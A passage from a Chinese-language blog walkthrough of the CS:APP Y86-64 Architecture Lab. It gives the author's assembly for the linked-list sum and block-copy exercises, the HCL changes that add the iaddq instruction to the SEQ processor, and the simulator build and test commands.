</li><li>rrmovq指令表示将一个<strong>寄存器中的值</strong>存进一个<strong>寄存器</strong>中</li><li>rmmovq指令表示将一个<strong>寄存器中的值</strong>存进一个<strong>内存地址所对应的内存</strong>中</li><li>mrmovq指令表示将一个<strong>内存中的值</strong>存进一个<strong>寄存器</strong>中</li></ul><p>所以我们要注意，没有mmmovq，不能将内存中的值和内存中的值进行直接转移，需要拿寄存器存起来。</p><h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><blockquote><p>一开始还在纳闷为啥part_A没有教程，自己一做，发现确实简单，就是一些指令的运用热身罢了。坚持坚持，都能做出来的啦！</p></blockquote><h2 id="Sum-ys"><a href="#Sum-ys" class="headerlink" title="Sum.ys"></a>Sum.ys</h2><blockquote><p>RULES:</p><p>Write a Y86-64 program sum.ys that iteratively sums the elements of a linked list. Your program should consist of some code that sets up the stack structure, invokes a function, and then halts.<br>In this case,the function should be Y86-64 code for a function (sum list) that is functionally equivalent to the C sum list function in Figure 1.</p><p>写一个Y86-64程序sum.ys，迭代地对链表的元素求和。你的程序应该由一些代码组成，这些代码设置堆栈结构，调用函数，然后停止。在这种情况下，该函数应该是Y86-64代码，用于在功能上等同于图1中的C sum list函数的函数（sum list）。使用以下三元素列表测试程序：</p></blockquote><p>sum list</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">sum_list</span><span class="token punctuation">(</span>list_ptr ls<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>ls<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>val <span class="token operator">+=</span> ls<span class="token operator">-></span>val<span class="token punctuation">;</span>ls <span class="token operator">=</span> ls<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们就是仿照CSAPP课本中文版p252页的完整Y86-64汇编代码流程翻译Sum_List函数,汇编代码如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># Execution begins at address 0        .pos 0        irmovq stack, %rsp        call main        halt # Sample linked list .align 8ele1:         .quad 0x00a        .quad ele2ele2:        .quad 0x0b0        .quad ele3ele3:            .quad 0xc00        .quad 0# get mainmain:        irmovq ele1, %rdi        call sum_list       # sum(list_ptr ls)        ret# long sum_list(list_ptr ls)# start in %rdisum_list:        xorq %rax,%rax   #rax--&gt;sum_list&#x3D;0        andq %rdi ,%rdi   # test         jmp testloop:         mrmovq (%rdi),%rsi        addq %rsi,%rax                mrmovq 8(%rdi),%rdi  # rdi---&gt;next        andq %rdi,%rdi          # test rditest:         jne loop # rdi&#x3D;&#x3D;0 ret        ret        .pos 0x200stack:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用yas和yis进行测试,若%rax&#x3D;&#x3D;0xcba则成功!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004858.png" alt="image-20240314223820052"></p><h2 id="rsum-ys"><a href="#rsum-ys" class="headerlink" title="rsum.ys"></a>rsum.ys</h2><blockquote><p><strong>rsum.ys: Recursively sum linked list elements</strong><br>Write a Y86-64 program rsum.ys that recursively sums the elements of a linked list. This code should be similar to the code in sum.ys, except that it should use a function rsum list that recursively sums a<br>list of numbers, as shown with the C function rsum list in Figure 1. Test your program using the same three-element list you used for testing list.ys.</p><p>编写一个Y86-64程序rsum.ys，递归地对链表的元素求和。这段代码应该与sum.ys中的代码类似，只是它应该使用一个函数rsum list来递归地对一个数字列表求和，如图1中的C函数rsum list所示。</p></blockquote><p>rsum_list</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">rsum_list</span><span class="token punctuation">(</span>list_ptr ls<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ls<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">long</span> val <span class="token operator">=</span> ls<span class="token operator">-></span>val<span class="token punctuation">;</span><span class="token keyword">long</span> rest <span class="token operator">=</span> <span class="token function">rsum_list</span><span class="token punctuation">(</span>ls<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> val <span class="token operator">+</span> rest<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>递归操作由Bomblab的经验可以知道,肯定需要使用pushq和popq操作,递归调用即可,判断一下地址为0就是递归尽头就好了,简单!~~</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># rsum.ys: Recursively sum linked list elements# author Vite# Execution begins at address 0        .pos 0        irmovq stack, %rsp        call main        halt # Sample linked list .align 8ele1:         .quad 0x00a        .quad ele2ele2:        .quad 0x0b0        .quad ele3ele3:            .quad 0xc00        .quad 0# get mainmain:        irmovq ele1, %rdi        call rsum_list        ret         rsum_list:        andq %rdi ,%rdi        je return        mrmovq (%rdi),%rsi        mrmovq 8(%rdi),%rdi        pushq %rsi        call rsum_list        popq %rsi        addq %rsi,%rax        retreturn:        irmovq $0x0, %rax        ret        .pos 0x200stack:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写完后测试提交,$rax的值正确!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004890.png" alt="image-20240314232113865"></p><h2 id="copy-ys"><a href="#copy-ys" class="headerlink" title="copy.ys"></a>copy.ys</h2><blockquote><p><strong>copy.ys: Copy a source block to a destination block</strong><br>Write a program (copy.ys) that copies a block of words from one part of memory to another (non-overlapping area) area of memory, computing the checksum (Xor) of all the words copied. Your program should consist of code that sets up a stack frame, invokes a function copy block, and then halts. The function should be functionally equivalent to the C function copy block shown in Figure 1. Test your program using the following three-element source and destination blocks:</p><p>编写一个程序（copy.ys），将一个字块从内存的一部分复制到内存的另一个（非重叠区域）区域，计算所有复制的字的校验和（Xor）。你的程序应该由建立堆栈框架、调用函数复制块、然后停止的代码组成。该函数在功能上应等同于图1所示的C函数复制块。</p></blockquote><p>copy_block</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">copy_block</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token keyword">long</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">long</span> val <span class="token operator">=</span> <span class="token operator">*</span>src<span class="token operator">++</span><span class="token punctuation">;</span><span class="token operator">*</span>dest<span class="token operator">++</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>result <span class="token operator">^=</span> val<span class="token punctuation">;</span>len<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大致思路：</p><p>取出src[0]的值,丢到dest[0]中,把%rax的值xor val,然后把len–,每次进入循环要记得判断len,要是len&#x3D;0就退出循环</p><p>然后开始仿照前两个函数构建汇编代码，注意语句，<del>反正写的错了他也会告诉你错了，再改就是了</del></p><p>故最终的汇编代码为：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># copy.ys: Copy a source block to a destination block# autor Vite# exe begins in address 0        .pos 0        irmovq stack , %rsp        call main        halt #Sample linked         .align 8# Source blocksrc:        .quad 0x00a        .quad 0x0b0        .quad 0xc00# Destination blockdest:        .quad 0x111        .quad 0x222        .quad 0x333# make mainmain:        irmovq src , %rdi        irmovq dest, %rsi        irmovq $3 , %rdx        xorq %rax,%rax         call copy_block        ret        copy_block:        andq %rdx,%rdx        je return         mrmovq (%rdi), %r8        rmmovq %r8, (%rsi)        xorq %r8, %rax        irmovq $8 ,%r8        addq %r8,%rdi        addq %r8,%rsi        irmovq $1, %r8        subq %r8 ,%rdx        call copy_blockreturn :        ret    .pos 0x200 stack: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单教一下，看下%rax中存的返回值，再看下memory中的改变值，类似于下图，完成题目要求，通关Part_A!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004934.png" alt="image-20240316191316678"></p><h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><blockquote><p>概要：SEQ课本中文版P278 4.3SEQ的实现，图4-27往后。</p><p>直接对着SEQ的流程图进行模仿，挨个把IADDQ这个关键字丢进去。然后编译运行</p></blockquote><blockquote><p>Your task in Part B is to extend the SEQ processor to support the iaddq, described in Homework problems 4.51 and 4.52. To add this instructions, you will modify the file seq-full.hcl, which implements the version of SEQ described in the CS:APP3e textbook. In addition, it contains declarations of some constants that you will need for your solution.</p><p>您在B部分的任务是扩展SEQ处理器以支持iaddq，如作业问题4.51和4.52所述。要添加此说明，您需要修改seq-full.hcl文件，该文件实现了CS：APP 3e教科书中描述的SEQ版本。此外，它还包含解决方案所需的一些常数的声明。</p></blockquote><p>4.51:练习题4.3介绍了iaddq 指令，即将立即数与寄存器相加。描述实现该指令所执行的计算。参考irmovq 和 OPq 指令的计算（图 4-18)</p><p>4.52:文件seq-full.hcl包含SEQ的HCL描述,并将常数IIADDQ声明为十六进制值C,也就是 iad­dq的指令代码.修改实现iaddq指令的控制逻辑块的HCL描述,就像练习题4.3和家庭作业4.51中描述的那样.可以参考实验资料获得如何为你的解答生成模拟器以及如何测试模拟器的指导。</p><p>图 4-18 给出了对 OPq( 整数和逻辑运算）、rrmovq( 寄存器－寄存器传送）和 irmovq( 立即数－寄存器传送）类型的指令所需的处理。让我们先来考虑一下整数操作。回顾图4-2,可以看到我们小心地选择了指令编码，这样四个整数操作 (addq 、subq 、andq 和 xorq) 都有相同的 icode 值.我们可以以相同的步骤顺序来处理它们，除了 ALU 计算必须根据ifun中编码的具体的指令操作来设定。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004965.png" alt="image-20240316230352428"></p><p>iaddq指令如下：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004996.png" alt="image-20240316230542567"></p><p>取指阶段：从PC中取</p><ol><li>取icode:ifun &lt;—M<del>1</del>[PC]</li><li>取rA：rB&lt;—M<del>1</del>[PC+1]</li><li>取ValC&lt;—M<del>8</del>[PC+2]</li><li>更新Valp&lt;–PC+10</li></ol><p>译码阶段：ValB&lt;—R[rB]</p><p>执行阶段：ValE &lt;– ValB-ValC</p><p>写回阶段：R[rB]&lt;—ValE</p><p>更新PC： PC&lt;—Valp</p><p>寄存器 ID dstE 表明写端口E 的目的寄存器，计算出来的值 valE 将放在那里。</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>需要更新的部分有以下几部分:</p><h3 id="Fetch-Stage"><a href="#Fetch-Stage" class="headerlink" title="Fetch Stage"></a>Fetch Stage</h3><ul><li>instr_valid&#x3D;icode in</li></ul><p>该信号判断是否为合法指令</p><ul><li>need——regids</li></ul><p>需要读取寄存器rb</p><ul><li>need_valc</li></ul><p>需要立即数valC</p><pre class="line-numbers language-none"><code class="language-none">################ Fetch Stage     ###################################bool instr_valid &#x3D; icode in &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;# Does fetched instruction require a regid byte?获取的指令是否需要regid字节？bool need_regids &#x3D;icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,      IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;# Does fetched instruction require a constant word?bool need_valC &#x3D;icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ &#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Decode-Stage"><a href="#Decode-Stage" class="headerlink" title="Decode Stage"></a>Decode Stage</h3><ul><li>srcB:rB</li><li>dstE</li></ul><pre class="line-numbers language-none"><code class="language-none">## What register should be used as the B source?word srcB &#x3D; [icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ,IIADDQ  &#125; : rB;icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;1 : RNONE;  # Don&#39;t need register];## What register should be used as the E destination?word dstE &#x3D; [icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;icode in &#123; IIRMOVQ, IOPQ,IIADDQ&#125; : rB;icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;1 : RNONE;  # Don&#39;t write any register];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Execute-Stage"><a href="#Execute-Stage" class="headerlink" title="Execute Stage"></a>Execute Stage</h3><ul><li>aluA:valC</li><li>aluB:valB</li><li>set_cc</li></ul><pre class="line-numbers language-none"><code class="language-none">################ Execute Stage   ##################################### Select input A to ALUword aluA &#x3D; [icode in &#123; IRRMOVQ, IOPQ &#125; : valA;icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ &#125; : valC;icode in &#123; ICALL, IPUSHQ &#125; : -8;icode in &#123; IRET, IPOPQ &#125; : 8;# Other instructions don&#39;t need ALU];## Select input B to ALUword aluB &#x3D; [icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL,       IPUSHQ, IRET, IPOPQ,IIADDQ &#125; : valB;icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;# Other instructions don&#39;t need ALU];## Should the condition codes be updated?bool set_cc &#x3D; icode in &#123; IOPQ, IIADDQ&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Memory-Stage-PC-update"><a href="#Memory-Stage-PC-update" class="headerlink" title="Memory Stage &amp;&amp; PC update"></a>Memory Stage &amp;&amp; PC update</h3><p>&#x3D;&#x3D;none&#x3D;&#x3D;</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><p>以下是完整代码：</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">#&#x2F;* $begin seq-all-hcl *&#x2F;#####################################################################  HCL Description of Control for Single Cycle Y86-64 Processor SEQ   ##  Copyright (C) Randal E. Bryant, David R. O&#39;Hallaron, 2010       ####################################################################### Your task is to implement the iaddq instruction## The file contains a declaration of the icodes## for iaddq (IIADDQ)## Your job is to add the rest of the logic to make it work#####################################################################    C Include&#39;s.  Don&#39;t alter these    #不要改变这些                           #####################################################################quote &#39;#include &lt;stdio.h&gt;&#39;quote &#39;#include &quot;isa.h&quot;&#39;quote &#39;#include &quot;sim.h&quot;&#39;quote &#39;int sim_main(int argc, char *argv[]);&#39;quote &#39;word_t gen_pc()&#123;return 0;&#125;&#39;quote &#39;int main(int argc, char *argv[])&#39;quote &#39;  &#123;plusmode&#x3D;0;return sim_main(argc,argv);&#125;&#39;#####################################################################    Declarations.  Do not change&#x2F;remove&#x2F;delete any of these       ########################################################################## Symbolic representation of Y86-64 Instruction Codes Y86-64指令码的符号表示 #############wordsig INOP &#39;I_NOP&#39;wordsig IHALT&#39;I_HALT&#39;wordsig IRRMOVQ&#39;I_RRMOVQ&#39;wordsig IIRMOVQ&#39;I_IRMOVQ&#39;wordsig IRMMOVQ&#39;I_RMMOVQ&#39;wordsig IMRMOVQ&#39;I_MRMOVQ&#39;wordsig IOPQ&#39;I_ALU&#39;wordsig IJXX&#39;I_JMP&#39;wordsig ICALL&#39;I_CALL&#39;wordsig IRET&#39;I_RET&#39;wordsig IPUSHQ&#39;I_PUSHQ&#39;wordsig IPOPQ&#39;I_POPQ&#39;# Instruction code for iaddq instructionwordsig IIADDQ&#39;I_IADDQ&#39;##### Symbolic represenations of Y86-64 function codes Y86-64函数代码的符号表示                 #####wordsig FNONE    &#39;F_NONE&#39;        # Default function code##### Symbolic representation of Y86-64 Registers referenced explicitly明确引用的Y86-64寄存器的符号表示 #####wordsig RRSP     &#39;REG_RSP&#39;    # Stack Pointerwordsig RNONE    &#39;REG_NONE&#39;   # Special value indicating &quot;no register&quot;##### ALU Functions referenced explicitly    ALU函数显式引用                        #####wordsig ALUADD&#39;A_ADD&#39;# ALU should add its arguments##### Possible instruction status values   可能的指令状态值                    #####wordsig SAOK&#39;STAT_AOK&#39;# Normal executionwordsig SADR&#39;STAT_ADR&#39;# Invalid memory addresswordsig SINS&#39;STAT_INS&#39;# Invalid instructionwordsig SHLT&#39;STAT_HLT&#39;# Halt instruction encountered##### Signals that can be referenced by control logic控制逻辑可参考的信号 ######################### Fetch stage inputs#####wordsig pc &#39;pc&#39;# Program counter##### Fetch stage computations获取阶段计算#####wordsig imem_icode &#39;imem_icode&#39;# icode field from instruction memory 来自指令存储器的icode字段wordsig imem_ifun  &#39;imem_ifun&#39; # ifun field from instruction memory来自指令存储器的ifun字段wordsig icode  &#39;icode&#39;# Instruction control code指令控制码wordsig ifun  &#39;ifun&#39;# Instruction function指导作用wordsig rA  &#39;ra&#39;# rA field from instruction指令中的rA字段wordsig rB  &#39;rb&#39;# rB field from instructionwordsig valC  &#39;valc&#39;# Constant from instruction指令中常数wordsig valP  &#39;valp&#39;# Address of following instructionboolsig imem_error &#39;imem_error&#39;# Error signal from instruction memoryboolsig instr_valid &#39;instr_valid&#39;# Is fetched instruction valid?##### Decode stage computations#####wordsig valA&#39;vala&#39;# Value from register A portwordsig valB&#39;valb&#39;# Value from register B port##### Execute stage computations#####wordsig valE&#39;vale&#39;# Value computed by ALUboolsig Cnd&#39;cond&#39;# Branch test##### Memory stage computations#####wordsig valM&#39;valm&#39;# Value read from memoryboolsig dmem_error &#39;dmem_error&#39;# Error signal from data memory#####################################################################    Control Signal Definitions.   控制信号定义                      ##################################################################################### Fetch Stage     #################################### Determine instruction codeword icode &#x3D; [imem_error: INOP;1: imem_icode;# Default: get from instruction memory];# Determine instruction functionword ifun &#x3D; [imem_error: FNONE;1: imem_ifun;# Default: get from instruction memory];bool instr_valid &#x3D; icode in &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;# Does fetched instruction require a regid byte?获取的指令是否需要regid字节？bool need_regids &#x3D;icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,      IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;# Does fetched instruction require a constant word?bool need_valC &#x3D;icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ &#125;;################ Decode Stage    ##################################### What register should be used as the A source?哪个寄存器应该用作A源word srcA &#x3D; [icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;icode in &#123; IPOPQ, IRET &#125; : RRSP;1 : RNONE; # Don&#39;t need register];## What register should be used as the B source?word srcB &#x3D; [icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ,IIADDQ  &#125; : rB;icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;1 : RNONE;  # Don&#39;t need register];## What register should be used as the E destination?word dstE &#x3D; [icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;icode in &#123; IIRMOVQ, IOPQ,IIADDQ&#125; : rB;icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;1 : RNONE;  # Don&#39;t write any register];## What register should be used as the M destination?word dstM &#x3D; [icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;1 : RNONE;  # Don&#39;t write any register];################ Execute Stage   ##################################### Select input A to ALUword aluA &#x3D; [icode in &#123; IRRMOVQ, IOPQ &#125; : valA;icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ &#125; : valC;icode in &#123; ICALL, IPUSHQ &#125; : -8;icode in &#123; IRET, IPOPQ &#125; : 8;# Other instructions don&#39;t need ALU];## Select input B to ALUword aluB &#x3D; [icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL,       IPUSHQ, IRET, IPOPQ,IIADDQ &#125; : valB;icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;# Other instructions don&#39;t need ALU];## Set the ALU functionword alufun &#x3D; [icode &#x3D;&#x3D; IOPQ : ifun;1 : ALUADD;];## Should the condition codes be updated?bool set_cc &#x3D; icode in &#123; IOPQ, IIADDQ&#125;;################ Memory Stage    ##################################### Set read control signalbool mem_read &#x3D; icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;## Set write control signalbool mem_write &#x3D; icode in &#123; IRMMOVQ, IPUSHQ, ICALL&#125;;## Select memory addressword mem_addr &#x3D; [icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ&#125; : valE;icode in &#123; IPOPQ, IRET &#125; : valA;# Other instructions don&#39;t need address];## Select memory input dataword mem_data &#x3D; [# Value from registericode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;# Return PCicode &#x3D;&#x3D; ICALL : valP;# Default: Don&#39;t write anything];## Determine instruction status确定指令状态word Stat &#x3D; [imem_error || dmem_error : SADR;!instr_valid: SINS;icode &#x3D;&#x3D; IHALT : SHLT;1 : SAOK;];################ Program Counter Update ############################## What address should instruction be fetched atword new_pc &#x3D; [# Call.  Use instruction constanticode &#x3D;&#x3D; ICALL : valC;# Taken branch.  Use instruction constanticode &#x3D;&#x3D; IJXX &amp;&amp; Cnd : valC;# Completion of RET instruction.  Use value from stackicode &#x3D;&#x3D; IRET : valM;# Default: Use incremented PC1 : valP;];#&#x2F;* $end seq-all-hcl *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>修改完后需要通过该HCL文件构建SEQ仿真器（ssim）的新实例，然后对其进行测试：</p><ol><li>根据<code>seq-full.hcl</code>文件构建新的仿真器</li></ol><p>cd到seq文件夹中输入以下命令：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">make VERSION=full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**注意：**如果你不含有<code>Tcl/Tk</code>，需要在<code>Makefile</code>中将对应行注释掉</p><p>**注意：**若出现以下问题：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004054.png" alt="image-20240317235047306"></p><p>解决方法：在seq文件夹中打开ssim.c，ctrl+f查询matherr，将相关两行代码注释掉，继续执行<code>make VERSION=full</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004087.png" alt="image-20240317235212547"></p><ol start="2"><li>在小的Y86-64程序中测试你的方法</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">./ssim -t ../y86-code/asumi.yo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果失败了，还要重新修改你的实现，若成功则类似于下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004118.png" alt="image-20240318000003947"></p><ol start="3"><li>使用基准程序来测试你的方法</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd ../y86-code; make testssim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将在基准程序上运行ssim，并通过将结果处理器状态与高级ISA仿真中的状态进行比较来检查正确性。注意，这些程序均未测试添加的指令，只是确保你的方法没有为原始说明注入错误。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004151.png" alt="image-20240318000047663"></p><ol start="4"><li>一旦可以正确执行基准测试程序，则应在<code>../ptest</code>中运行大量的回归测试</li></ol><ul><li>测试除了<code>iaddq</code>以外的所有指令</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd ../ptest; make SIM=../seq/ssim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现了大量的warning不用担心，关注结果即可！</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004185.png" alt="image-20240318000131353"></p><ul><li>测试我们实现的<code>iaddq</code>指令</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd ../ptest; make SIM=../seq/ssim TFLAGS=-i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004223.png" alt="image-20240318000223494"></p><p>若关键信息都Succeed那么就代表这个对于IADDQ的描述是正确的，Part_B通关！</p><blockquote><p>这个warning烦了我两天，乱搞之中不知道搞了什么，连make都失败了，索性重头解压tar做了一遍</p></blockquote><h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>总览：</p><blockquote><p>这部分工作目录在 <code>sim/pipe</code> 下，题目给定了 ncopy 函数的 C 代码，这个函数和 Part A 的第三题差不多，将 src 数组复制到 dest 数组，并返回数组中的正数的总数。题目还给定了这个函数的 Y86-64 代码，并在文件 <code>pipe-full.hcl</code> 中实现了一个包含 <code>IIADDQ</code> 常量的 PIPE 。题目要求修改 [ncopy.ys]和 [pipe-full.hcl] ，使得 <code>ncopy.ys</code> 运行得尽可能快。</p></blockquote><p>测试命令(参考官方文档第八页)：</p><p>1、保证代码正确：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">./correctness.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、保证模拟器正确</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd ../y86-code; make 